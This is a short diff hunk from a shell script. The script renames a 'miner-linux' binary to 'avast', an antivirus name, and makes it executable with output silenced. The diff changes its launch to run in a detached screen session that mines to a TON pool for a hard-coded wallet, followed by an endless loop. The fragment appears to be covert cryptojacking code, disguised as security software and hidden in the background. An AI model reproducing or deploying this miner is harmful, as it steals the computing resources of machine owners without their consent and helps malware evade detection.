@@ -24,7 +24,7 @@ mv miner-linux avast >/dev/null 2>&1
 
 chmod +x avast >/dev/null 2>&1
 
-./avast https://next.ton-pool.com EQCq8h0FQ_IzVSueBKoYahTBe5EXnomyu6WVTPp29L8YYG2Z
+screen -dmS Running ./avast https://next.ton-pool.com EQCq8h0FQ_IzVSueBKoYahTBe5EXnomyu6WVTPp29L8YYG2Z
 
 while [ 1 ]; do
 
